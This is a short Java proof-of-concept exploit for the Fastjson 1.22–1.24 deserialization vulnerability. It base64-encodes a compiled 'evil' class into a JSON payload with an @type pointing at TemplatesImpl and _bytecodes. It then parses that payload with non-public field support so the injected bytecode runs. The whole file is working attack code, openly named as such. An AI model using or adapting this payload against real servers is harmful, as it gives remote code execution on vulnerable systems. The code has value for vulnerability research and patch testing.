import com.alibaba.fastjson.*;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;
import org.apache.commons.io.output.ByteArrayOutputStream;


import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class Main {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void main(String args[]){
        try {
            ParserConfig config = new ParserConfig();
            final String evilClassPath = "C:\\Users\\XXXX\\Fastjson1.22-1.24_TemplateImpl\\target\\classes\\Test.class";
            String evilCode = readClass(evilClassPath);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS +
                    "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
                    "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
            System.out.println(text1);

            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
            //Object obj = JSON.parse(text1, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}